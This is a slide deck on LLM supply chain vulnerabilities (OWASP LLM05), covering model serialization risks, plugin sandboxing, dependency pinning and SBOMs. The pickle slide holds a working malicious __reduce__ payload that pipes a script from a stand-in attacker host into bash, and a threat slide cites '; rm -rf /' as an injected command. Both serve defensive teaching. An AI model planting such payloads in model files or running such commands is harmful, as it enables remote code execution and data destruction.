# LLM05: Supply Chain Vulnerabilities
## Mark Veltzer
### Senior Software Engineer

---

## What Are LLM Supply Chain Vulnerabilities?

Supply chain vulnerabilities arise when **third-party components** used in `LLM` applications introduce security risks

- `LLM` systems depend on pre-trained models, plugins, training data, and software libraries from external sources
- Ranked **#5** in the OWASP Top 10 for LLM Applications
- A compromised component anywhere in the chain can undermine the entire system

Key insight: you inherit the security posture of **every dependency** in your `LLM` stack

---

## The LLM Supply Chain Attack Surface

<svg viewBox="0 0 800 300" xmlns="http://www.w3.org/2000/svg">
  <rect x="30" y="30" width="150" height="60" fill="#e74c3c" rx="8"/>
  <text x="105" y="55" text-anchor="middle" fill="white" font-size="12" font-weight="bold">Pre-trained Models</text>
  <text x="105" y="73" text-anchor="middle" fill="white" font-size="10">Hugging Face, registries</text>
  <rect x="210" y="30" width="150" height="60" fill="#e67e22" rx="8"/>
  <text x="285" y="55" text-anchor="middle" fill="white" font-size="12" font-weight="bold">Plugins / Extensions</text>
  <text x="285" y="73" text-anchor="middle" fill="white" font-size="10">Tools, connectors, agents</text>
  <rect x="390" y="30" width="150" height="60" fill="#f39c12" rx="8"/>
  <text x="465" y="55" text-anchor="middle" fill="white" font-size="12" font-weight="bold">Libraries / SDKs</text>
  <text x="465" y="73" text-anchor="middle" fill="white" font-size="10">LangChain, transformers</text>
  <rect x="570" y="30" width="180" height="60" fill="#8e44ad" rx="8"/>
  <text x="660" y="55" text-anchor="middle" fill="white" font-size="12" font-weight="bold">Training / Fine-tune Data</text>
  <text x="660" y="73" text-anchor="middle" fill="white" font-size="10">Datasets, embeddings</text>
  <line x1="105" y1="90" x2="400" y2="150" stroke="#333" stroke-width="2" marker-end="url(#sc1)"/>
  <line x1="285" y1="90" x2="400" y2="150" stroke="#333" stroke-width="2" marker-end="url(#sc1)"/>
  <line x1="465" y1="90" x2="400" y2="150" stroke="#333" stroke-width="2" marker-end="url(#sc1)"/>
  <line x1="660" y1="90" x2="400" y2="150" stroke="#333" stroke-width="2" marker-end="url(#sc1)"/>
  <defs>
    <marker id="sc1" markerWidth="10" markerHeight="10" refX="10" refY="5" orient="auto">
      <polygon points="0 0, 10 5, 0 10" fill="#333"/>
    </marker>
  </defs>
  <rect x="300" y="150" width="200" height="60" fill="#2c3e50" rx="8"/>
  <text x="400" y="175" text-anchor="middle" fill="white" font-size="13" font-weight="bold">Your LLM Application</text>
  <text x="400" y="195" text-anchor="middle" fill="white" font-size="11">Inherits all risks</text>
  <text x="400" y="260" text-anchor="middle" fill="#c0392b" font-size="13" font-weight="bold">Every external component is a potential entry point for attackers</text>
</svg>

---

## Third-Party Model Risks

Using pre-trained or fine-tuned models from external sources introduces several risks

| Risk | Description | Impact |
|------|-------------|--------|
| Backdoors | Hidden triggers that alter behavior | Data exfiltration, misuse |
| Serialization exploits | Malicious code in model files | Remote code execution |
| License violations | Undisclosed training data origins | Legal liability |
| Outdated models | Unpatched known vulnerabilities | Exploitable weaknesses |
| Typosquatting | Impersonating trusted model publishers | Supply chain compromise |

A model checkpoint is **executable code** in many frameworks, not just static weights

---

## Serialization Attacks: Pickle Exploits

Many `ML` frameworks use Python's `pickle` for model serialization, which can execute **arbitrary code on load**

```python
import pickle
import os

class MaliciousModel:
    """A model file that runs code when loaded."""
    def __reduce__(self):
        # This runs when pickle.load() is called
        return (os.system, (
            "curl https://evil.com/steal.sh | bash",
        ))

# Attacker saves this as a model checkpoint
with open("model.pkl", "wb") as f:
    pickle.dump(MaliciousModel(), f)

# Victim loads "model" and gets compromised
model = pickle.load(open("model.pkl", "rb"))  # RCE!
```

Never use `pickle.load()` on untrusted model files

---

## Safer Model Loading Practices

Use formats and tools that **prevent code execution** during deserialization

```python
# BAD: pickle-based loading (allows arbitrary code execution)
import torch
model = torch.load("untrusted_model.pt")  # DANGEROUS

# BETTER: use weights_only=True (PyTorch 2.0+)
model = torch.load(
    "model.pt",
    weights_only=True  # Only loads tensor data
)

# BEST: use SafeTensors format (no code execution possible)
from safetensors.torch import load_file
model_weights = load_file("model.safetensors")

# BEST: verify checksum before loading anything
import hashlib
sha256 = hashlib.sha256(open("model.safetensors", "rb").read())
assert sha256.hexdigest() == EXPECTED_HASH
```

The `safetensors` format stores only tensor data with no code execution surface

---

## Model Provenance Verification

Establish a chain of trust for every model used in production

```python
from dataclasses import dataclass

TRUSTED_PUBLISHERS = {
    "meta-llama", "mistralai", "google",
    "openai", "microsoft", "anthropic",
}

@dataclass
class ModelPolicy:
    require_trusted_publisher: bool = True
    require_hash_verification: bool = True
    require_vulnerability_scan: bool = True
    allowed_formats: tuple = ("safetensors",)

def validate_model(model_id: str, policy: ModelPolicy):
    org = model_id.split("/")[0]
    if policy.require_trusted_publisher:
        if org not in TRUSTED_PUBLISHERS:
            raise SecurityError(
                f"Untrusted publisher: {org}"
            )
    if policy.require_hash_verification:
        verify_checksum(model_id)
    if policy.require_vulnerability_scan:
        scan_for_known_cves(model_id)
```

---

## Plugin and Extension Security

`LLM` plugins extend functionality but expand the attack surface

<svg viewBox="0 0 800 280" xmlns="http://www.w3.org/2000/svg">
  <rect x="280" y="20" width="240" height="50" fill="#2c3e50" rx="8"/>
  <text x="400" y="50" text-anchor="middle" fill="white" font-size="13" font-weight="bold">LLM Application</text>
  <rect x="40" y="120" width="155" height="50" fill="#27ae60" rx="8"/>
  <text x="117" y="150" text-anchor="middle" fill="white" font-size="12" font-weight="bold">Web Search Plugin</text>
  <rect x="220" y="120" width="155" height="50" fill="#e67e22" rx="8"/>
  <text x="297" y="150" text-anchor="middle" fill="white" font-size="12" font-weight="bold">Code Exec Plugin</text>
  <rect x="400" y="120" width="155" height="50" fill="#e74c3c" rx="8"/>
  <text x="477" y="150" text-anchor="middle" fill="white" font-size="12" font-weight="bold">DB Query Plugin</text>
  <rect x="580" y="120" width="170" height="50" fill="#8e44ad" rx="8"/>
  <text x="665" y="150" text-anchor="middle" fill="white" font-size="12" font-weight="bold">Third-Party API Plugin</text>
  <line x1="350" y1="70" x2="117" y2="120" stroke="#333" stroke-width="2" marker-end="url(#sc2)"/>
  <line x1="380" y1="70" x2="297" y2="120" stroke="#333" stroke-width="2" marker-end="url(#sc2)"/>
  <line x1="420" y1="70" x2="477" y2="120" stroke="#333" stroke-width="2" marker-end="url(#sc2)"/>
  <line x1="450" y1="70" x2="665" y2="120" stroke="#333" stroke-width="2" marker-end="url(#sc2)"/>
  <defs>
    <marker id="sc2" markerWidth="10" markerHeight="10" refX="10" refY="5" orient="auto">
      <polygon points="0 0, 10 5, 0 10" fill="#333"/>
    </marker>
  </defs>
  <text x="400" y="220" text-anchor="middle" fill="#c0392b" font-size="12" font-weight="bold">Each plugin runs with the application's permissions</text>
  <text x="400" y="240" text-anchor="middle" fill="#c0392b" font-size="12">A compromised plugin compromises the entire system</text>
</svg>

---

## Plugin Threat Vectors

Common ways plugins introduce vulnerabilities

1. **Excessive permissions**: a plugin requests more access than it needs
    - A "summarization" plugin that also writes files to disk
1. **Unvalidated inputs**: plugin passes `LLM` output directly to system calls
    - `LLM` generates `; rm -rf /` as part of a shell command
1. **Data exfiltration**: plugin sends user data to external endpoints
    - A "translation" plugin that logs full conversations to a third-party server
1. **Dependency hijacking**: the plugin itself depends on compromised packages
    - Plugin uses a `npm` package that was taken over by an attacker

---

## Securing Plugin Execution

Enforce **least privilege** and **sandboxing** for all plugins

```python
from dataclasses import dataclass, field

@dataclass
class PluginPermissions:
    can_read_files: bool = False
    can_write_files: bool = False
    can_network: bool = False
    can_execute_code: bool = False
    allowed_domains: list[str] = field(default_factory=list)
    max_output_size: int = 10000

class PluginSandbox:
    def __init__(self, plugin, permissions: PluginPermissions):
        self.plugin = plugin
        self.permissions = permissions

    def execute(self, action: str, params: dict) -> str:
        self.validate_action(action, params)
        # Run in isolated subprocess with resource limits
        result = self.run_sandboxed(
            self.plugin, action, params,
            timeout=30, memory_mb=256,
        )
        if len(result) > self.permissions.max_output_size:
            raise PluginError("Output size exceeded")
        return result
```

---

## Plugin Input and Output Validation

Never trust data flowing between the `LLM` and plugins

```python
import re

class PluginValidator:
    def validate_tool_call(self, tool_name: str,
                           arguments: dict) -> dict:
        """Sanitize LLM-generated tool arguments."""
        schema = self.get_schema(tool_name)
        # Type check all arguments
        for key, expected_type in schema.items():
            if key in arguments:
                if not isinstance(arguments[key], expected_type):
                    raise ValueError(
                        f"Invalid type for {key}"
                    )
        # Block shell injection in string arguments
        for key, value in arguments.items():
            if isinstance(value, str):
                if re.search(r"[;|&`$]", value):
                    raise SecurityError(
                        f"Suspicious chars in {key}: {value}"
                    )
        return arguments
```

Validate **both directions**: `LLM` output going to plugins and plugin output going back to the `LLM`

---

## Dependency Management Risks

`LLM` applications rely on deep dependency trees that are difficult to audit

```text
your-llm-app
  +-- langchain (v0.1.x)
  |   +-- openai
  |   +-- tiktoken
  |   +-- requests
  |   +-- pydantic
  |   +-- numpy
  |   +-- sqlalchemy
  |   +-- 40+ more packages...
  +-- transformers
  |   +-- torch
  |   +-- safetensors
  |   +-- huggingface-hub
  +-- chromadb
      +-- fastapi
      +-- onnxruntime
      +-- 20+ more packages...

Total: 100+ transitive dependencies
Any one of them can be compromised
```

---

## Real-World Case: Dependency Confusion Attacks

Attackers exploit package manager resolution to inject malicious packages

```text
Attack flow:
1. Company uses internal package "llm-utils" (v1.0)
   hosted on private registry
2. Attacker publishes "llm-utils" (v99.0) on public PyPI
3. Package manager resolves the higher version from PyPI
4. Malicious code executes during installation

# pip install resolves from public PyPI first:
$ pip install llm-utils
# Installs v99.0 from PyPI (malicious)
# Instead of v1.0 from internal registry (legitimate)
```

This attack has affected companies including **Microsoft, Apple, and Tesla**

---

## Dependency Verification Strategies

```python
# requirements.txt with pinned versions AND hashes
# Generate with: pip-compile --generate-hashes

langchain==0.1.16 \
    --hash=sha256:abc123...
openai==1.30.1 \
    --hash=sha256:def456...
transformers==4.40.2 \
    --hash=sha256:789abc...
```

Key practices:

1. **Pin exact versions** with cryptographic hashes
1. **Use a lockfile** (`pip-compile`, `poetry.lock`, `package-lock.json`)
1. **Scan for known vulnerabilities** (`pip-audit`, `safety`, `snyk`)
1. **Mirror dependencies** to an internal registry you control
1. **Review changelogs** before upgrading any dependency

---

## Automated Dependency Auditing

Integrate vulnerability scanning into your `CI/CD` pipeline

```yaml
# .github/workflows/dependency-audit.yml
name: Dependency Audit
on: [push, pull_request]

jobs:
  audit:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Install dependencies
        run: pip install -r requirements.txt

      - name: Run pip-audit
        run: |
          pip install pip-audit
          pip-audit --strict --desc

      - name: Check for known CVEs
        run: |
          pip install safety
          safety check --full-report

      - name: Verify dependency hashes
        run: pip install --require-hashes -r requirements.txt
```

Fail the build if any dependency has a known vulnerability or mismatched hash

---

## Software Bill of Materials (SBOM) for LLM Apps

An `SBOM` catalogs every component in your `LLM` application for auditing and compliance

```json
{
  "application": "customer-support-llm",
  "components": {
    "models": [
      {
        "name": "llama-3-8b",
        "version": "3.0",
        "publisher": "meta-llama",
        "hash": "sha256:a1b2c3...",
        "format": "safetensors",
        "license": "Llama 3 Community"
      }
    ],
    "plugins": [
      {
        "name": "web-search",
        "version": "2.1.0",
        "permissions": ["network:read"],
        "last_audit": "2025-12-01"
      }
    ],
    "libraries": [
      {"name": "langchain", "version": "0.1.16"}
    ]
  }
}
```

---

## Mitigating Supply Chain Risks: Checklist

<svg viewBox="0 0 800 340" xmlns="http://www.w3.org/2000/svg">
  <text x="400" y="25" text-anchor="middle" fill="#2c3e50" font-size="16" font-weight="bold">Supply Chain Security Controls</text>
  <rect x="40" y="45" width="340" height="55" fill="#e74c3c" rx="8"/>
  <text x="210" y="68" text-anchor="middle" fill="white" font-size="12" font-weight="bold">Models</text>
  <text x="210" y="85" text-anchor="middle" fill="white" font-size="11">Verify publisher, hash, format (safetensors)</text>
  <rect x="420" y="45" width="340" height="55" fill="#e67e22" rx="8"/>
  <text x="590" y="68" text-anchor="middle" fill="white" font-size="12" font-weight="bold">Plugins</text>
  <text x="590" y="85" text-anchor="middle" fill="white" font-size="11">Sandbox, least privilege, I/O validation</text>
  <rect x="40" y="115" width="340" height="55" fill="#27ae60" rx="8"/>
  <text x="210" y="138" text-anchor="middle" fill="white" font-size="12" font-weight="bold">Dependencies</text>
  <text x="210" y="155" text-anchor="middle" fill="white" font-size="11">Pin versions, verify hashes, audit CVEs</text>
  <rect x="420" y="115" width="340" height="55" fill="#2980b9" rx="8"/>
  <text x="590" y="138" text-anchor="middle" fill="white" font-size="12" font-weight="bold">Data Sources</text>
  <text x="590" y="155" text-anchor="middle" fill="white" font-size="11">Provenance tracking, integrity checks</text>
  <rect x="40" y="185" width="340" height="55" fill="#8e44ad" rx="8"/>
  <text x="210" y="208" text-anchor="middle" fill="white" font-size="12" font-weight="bold">CI/CD Pipeline</text>
  <text x="210" y="225" text-anchor="middle" fill="white" font-size="11">Automated scanning, SBOM generation</text>
  <rect x="420" y="185" width="340" height="55" fill="#2c3e50" rx="8"/>
  <text x="590" y="208" text-anchor="middle" fill="white" font-size="12" font-weight="bold">Monitoring</text>
  <text x="590" y="225" text-anchor="middle" fill="white" font-size="11">Behavioral drift, anomaly detection</text>
  <text x="400" y="290" text-anchor="middle" fill="#c0392b" font-size="13" font-weight="bold">Trust nothing by default. Verify everything before integration.</text>
</svg>

---

## Key Takeaways

- `LLM` supply chains include **models, plugins, libraries, and data** from third-party sources
- Model files using `pickle` serialization can execute **arbitrary code on load**; prefer `safetensors` format
- Verify model provenance with **cryptographic hashes** and restrict usage to **trusted publishers**
- Plugins must run with **least privilege** in **sandboxed environments** with validated inputs and outputs
- Pin all dependencies to **exact versions with hashes** and scan for known vulnerabilities in `CI/CD`
- Maintain a **Software Bill of Materials** (`SBOM`) to track every component in your `LLM` application
- Dependency confusion attacks exploit package resolution order; **mirror dependencies internally**
- Supply chain security requires **continuous auditing**, not just a one-time review
